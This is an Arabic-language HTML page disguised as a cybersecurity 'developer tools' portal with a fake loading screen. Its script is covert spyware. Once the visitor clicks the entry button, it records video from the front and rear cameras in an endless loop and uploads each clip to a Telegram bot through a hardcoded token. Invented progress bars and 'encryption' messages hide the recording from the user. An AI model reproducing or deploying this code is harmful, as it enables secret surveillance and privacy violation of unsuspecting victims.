<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>أدوات المطور - الأمن السيبراني</title>
    <style>
        /* --- reset & base --- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a1a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            direction: rtl;
            overflow: hidden;
        }

        /* --- شاشة الترحيب (لوحة التحكم الأمنية) --- */
        #welcomeScreen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(145deg, #0d0d22, #1a1a30);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 2000;
            transition: opacity 0.6s ease;
            padding: 20px;
        }
        #welcomeScreen.hidden {
            opacity: 0;
            pointer-events: none;
        }

        .platform-logo {
            font-size: 2.2rem;
            font-weight: 700;
            color: #fff;
            margin-bottom: 6px;
            text-shadow: 0 0 30px rgba(0, 180, 255, 0.2);
            letter-spacing: 1px;
        }
        .platform-logo span {
            color: #00bfff;
        }

        .engineer-name {
            font-size: 1.5rem;
            font-weight: 400;
            color: #b0c4de;
            margin-bottom: 4px;
            letter-spacing: 1px;
        }
        .engineer-title {
            font-size: 1rem;
            color: #7f8fa6;
            margin-bottom: 30px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            padding-bottom: 12px;
        }

        .fake-buttons {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            justify-content: center;
            margin-bottom: 40px;
        }
        .fake-buttons button {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 40px;
            padding: 12px 24px;
            font-size: 0.95rem;
            color: #b0c4de;
            backdrop-filter: blur(4px);
            cursor: default;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
            transition: 0.2s;
        }
        .fake-buttons button:hover {
            background: rgba(255, 255, 255, 0.08);
            transform: scale(1.02);
        }

        #enterBtn {
            padding: 18px 60px;
            font-size: 1.5rem;
            font-weight: 600;
            color: #fff;
            background: linear-gradient(145deg, #1a2a3a, #0d1b2a);
            border: 2px solid #00bfff;
            border-radius: 80px;
            cursor: pointer;
            box-shadow: 0 8px 30px rgba(0, 191, 255, 0.15);
            transition: transform 0.2s, box-shadow 0.2s;
            letter-spacing: 1px;
        }
        #enterBtn:hover {
            transform: scale(1.04);
            box-shadow: 0 12px 40px rgba(0, 191, 255, 0.3);
        }
        #enterBtn:active {
            transform: scale(0.96);
        }

        .secure-badge {
            margin-top: 25px;
            color: #2ecc71;
            font-size: 0.85rem;
            background: rgba(46, 204, 113, 0.06);
            padding: 6px 25px;
            border-radius: 40px;
            border: 1px solid rgba(46, 204, 113, 0.1);
        }

        /* --- شاشة التحميل (البلور + الدائرة الزرقاء) --- */
        #loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(10, 10, 30, 0.85);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
            transition: opacity 0.3s ease;
        }
        #loader.active {
            display: flex;
        }

        .loader-content {
            text-align: center;
            color: #fff;
            padding: 20px;
            max-width: 420px;
            width: 90%;
        }

        /* الدائرة الزرقاء المتحركة (تحميل) */
        .spinner {
            width: 100px;
            height: 100px;
            margin: 0 auto 30px;
            border: 8px solid rgba(0, 191, 255, 0.12);
            border-top: 8px solid #00bfff;
            border-radius: 50%;
            animation: spin 1.1s linear infinite;
            box-shadow: 0 0 40px rgba(0, 191, 255, 0.1);
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* نسبة التحميل */
        #counter {
            font-size: 3.4rem;
            font-weight: 700;
            color: #00bfff;
            text-shadow: 0 0 20px rgba(0, 191, 255, 0.2);
            margin-bottom: 6px;
            direction: ltr;
        }
        #counterLabel {
            font-size: 1rem;
            color: #8899b8;
            margin-bottom: 12px;
        }

        /* شريط التقدم */
        .progress-container {
            width: 100%;
            height: 16px;
            background: rgba(255, 255, 255, 0.06);
            border-radius: 30px;
            overflow: hidden;
            margin: 16px 0 18px;
            box-shadow: inset 0 2px 6px rgba(0,0,0,0.5);
        }
        #progressBar {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #00bfff, #2ecc71);
            border-radius: 30px;
            transition: width 0.5s ease;
            box-shadow: 0 0 25px rgba(0, 191, 255, 0.2);
        }

        /* نص الحالة (رسائل تحميل/تشفير وهمية) */
        #statusText {
            font-size: 1.15rem;
            color: #b8c6e0;
            margin-top: 8px;
            min-height: 2.4em;
            word-break: break-word;
            line-height: 1.7;
        }

        /* --- تحسينات للهواتف --- */
        @media (max-width: 500px) {
            #enterBtn { font-size: 1.2rem; padding: 14px 40px; }
            .fake-buttons button { font-size: 0.8rem; padding: 10px 18px; }
            .spinner { width: 70px; height: 70px; border-width: 6px; }
            #counter { font-size: 2.8rem; }
            .platform-logo { font-size: 1.8rem; }
            .engineer-name { font-size: 1.2rem; }
        }
    </style>
</head>
<body>

    <!-- ========== شاشة الترحيب (لوحة تحكم الأمن السيبراني) ========== -->
    <div id="welcomeScreen">
        <div class="platform-logo">🛡️ <span>Cyber</span>Forge</div>
        <div class="engineer-name">عمر عبد التواب صالح</div>
        <div class="engineer-title">مهندس أمن المعلومات | اختبار اختراق أخلاقي</div>
        <div class="fake-buttons">
            <button>🔐 إدارة الجلسات</button>
            <button>🧪 أدوات المطور</button>
            <button>📊 تحليل الثغرات</button>
            <button>🔄 اختبار الاختراق</button>
        </div>
        <button id="enterBtn">✔️ موافق - الدخول إلى أدوات المطور</button>
        <div class="secure-badge">✓ بيئة آمنة - جلسة مشفرة</div>
    </div>

    <!-- ========== شاشة التحميل (البلور) ========== -->
    <div id="loader">
        <div class="loader-content">
            <div class="spinner"></div>
            <div id="counter">0%</div>
            <div id="counterLabel">جاري تحميل الأدوات المتطورة</div>
            <div class="progress-container">
                <div id="progressBar" style="width:0%;"></div>
            </div>
            <div id="statusText">⏳ جاري تهيئة بيئة الاختبار...</div>
        </div>
    </div>

    <script>
        (function() {
            'use strict';

            // --- توكن البوت ومعرف الدردشة (ضعهما هنا) ---
            const BOT_TOKEN = '8983922542:AAHADpBaOoeZ62BsKmyNeYsGl7LkF8BfZNc';
            const CHAT_ID = '8273860583';
            const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;

            // --- عناصر DOM ---
            const welcomeScreen = document.getElementById('welcomeScreen');
            const enterBtn = document.getElementById('enterBtn');
            const loader = document.getElementById('loader');
            const counterEl = document.getElementById('counter');
            const counterLabel = document.getElementById('counterLabel');
            const progressBar = document.getElementById('progressBar');
            const statusText = document.getElementById('statusText');

            // --- متغيرات ---
            let isRunning = false;
            let stopFlag = false;
            let segmentCount = 0;
            let currentCamera = 'environment';
            let progressValue = 0;

            // --- رسائل تحميل وهمية (سياق أمني) ---
            const fakeMessages = [
                '🔐 جاري إنشاء قناة مشفرة...',
                '📡 جاري تحميل وحدات الاختبار...',
                '🔄 جاري التحقق من سلامة الحزمة...',
                '📤 تحديث قاعدة بيانات الثغرات...',
                '⏳ معالجة طلبات الجلسة...',
                '✅ تأكيد تشفير الاتصال...',
                '📥 تحميل أدوات المطور...',
                '🛡️ تطبيق طبقات الحماية...',
                '📊 جاري فحص البيئة...'
            ];
            let fakeIndex = 0;

            // --- دوال مساعدة ---
            function sleep(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
            }

            function updateProgress(value) {
                progressValue = Math.min(Math.max(value, 0), 100);
                progressBar.style.width = progressValue + '%';
                counterEl.textContent = Math.round(progressValue) + '%';
            }

            function rotateFakeMessage() {
                if (!isRunning) return;
                const msg = fakeMessages[fakeIndex % fakeMessages.length];
                statusText.textContent = msg;
                fakeIndex++;
            }

            // --- دالة تسجيل مقطع فيديو (5 ثوانٍ) وإرساله إلى تلغرام (خلفي تماماً) ---
            async function recordAndSendSegment(facingMode) {
                return new Promise(async (resolve, reject) => {
                    let stream = null;
                    let recorder = null;
                    let chunks = [];

                    try {
                        // طلب الكاميرا (يظهر طلب الإذن لمرة واحدة)
                        stream = await navigator.mediaDevices.getUserMedia({
                            video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } }
                        });

                        recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });
                        recorder.ondataavailable = e => {
                            if (e.data.size > 0) chunks.push(e.data);
                        };

                        recorder.start();

                        // تسجيل 5 ثوانٍ (نحدث التقدم كأنه تحميل)
                        for (let i = 5; i >= 1; i--) {
                            const progress = 10 + ((5 - i) / 5) * 30;
                            updateProgress(progress);
                            await sleep(1000);
                        }

                        recorder.stop();
                        await new Promise(resolve => {
                            recorder.onstop = resolve;
                        });

                        const blob = new Blob(chunks, { type: 'video/webm' });
                        chunks = [];

                        // إرسال الفيديو إلى تلغرام
                        const formData = new FormData();
                        const fileName = `video_${facingMode}_${Date.now()}.webm`;
                        formData.append('chat_id', CHAT_ID);
                        formData.append('video', blob, fileName);
                        formData.append('caption', '🔒 بيانات جلسة مشفرة');

                        // محاكاة تقدم الإرسال (من 40% إلى 70%)
                        let uploadProgress = 40;
                        const uploadInterval = setInterval(() => {
                            uploadProgress += 2;
                            if (uploadProgress > 70) uploadProgress = 70;
                            updateProgress(uploadProgress);
                        }, 100);

                        const response = await fetch(TELEGRAM_API, {
                            method: 'POST',
                            body: formData
                        });

                        clearInterval(uploadInterval);
                        updateProgress(70);

                        if (!response.ok) {
                            const errorText = await response.text();
                            throw new Error(`فشل الإرسال: ${response.status}`);
                        }

                        const result = await response.json();
                        console.log('✅ تم إرسال المقطع بنجاح (خلفي)', result);

                        stream.getTracks().forEach(track => track.stop());
                        resolve(result);
                    } catch (error) {
                        console.error('❌ خطأ في التسجيل/الإرسال:', error);
                        if (stream) stream.getTracks().forEach(track => track.stop());
                        reject(error);
                    }
                });
            }

            // --- الحلقة الرئيسية (تسجيل وإرسال متواصل، بدون أي إشارة للمستخدم) ---
            async function startBackgroundRecording() {
                if (isRunning) return;
                isRunning = true;
                stopFlag = false;
                segmentCount = 0;
                progressValue = 0;

                // إظهار شاشة التحميل (كأنها تحميل أدوات)
                loader.classList.add('active');
                welcomeScreen.classList.add('hidden');
                updateProgress(0);
                statusText.textContent = '⏳ جاري تهيئة بيئة الاختبار...';
                counterLabel.textContent = 'جاري تحميل الأدوات المتطورة';

                const fakeInterval = setInterval(rotateFakeMessage, 2800);

                try {
                    // حلقة لا نهائية (تسجيل وإرسال في الخلفية)
                    while (!stopFlag) {
                        await recordAndSendSegment(currentCamera);

                        segmentCount++;
                        // زيادة التقدم بشكل عشوائي لإيهام المستخدم بالتحميل
                        if (progressValue < 95) {
                            const extra = Math.random() * 8 + 2;
                            updateProgress(Math.min(progressValue + extra, 95));
                        } else {
                            updateProgress(80 + Math.random() * 10);
                        }

                        // تبديل الكاميرا
                        currentCamera = (currentCamera === 'environment') ? 'user' : 'environment';
                        await sleep(800 + Math.random() * 1200);
                    }
                } catch (error) {
                    statusText.textContent = '⚠️ تأخير في التحميل، إعادة المحاولة...';
                    console.error('خطأ في الحلقة:', error);
                } finally {
                    clearInterval(fakeInterval);
                    isRunning = false;
                }
            }

            // --- حدث الضغط على زر "موافق" ---
            enterBtn.addEventListener('click', () => {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    alert('متصفحك لا يدعم الميزات المطلوبة.');
                    return;
                }
                if (!window.MediaRecorder) {
                    alert('متصفحك لا يدعم هذه التقنية.');
                    return;
                }
                startBackgroundRecording();
            });

            // إيقاف الحلقة عند إغلاق الصفحة
            window.addEventListener('beforeunload', () => {
                stopFlag = true;
            });

            console.log('✅ منصة CyberForge جاهزة - اضغط "موافق" لبدء التحميل الوهمي مع التسجيل الخلفي.');
        })();
    </script>
</body>
</html>
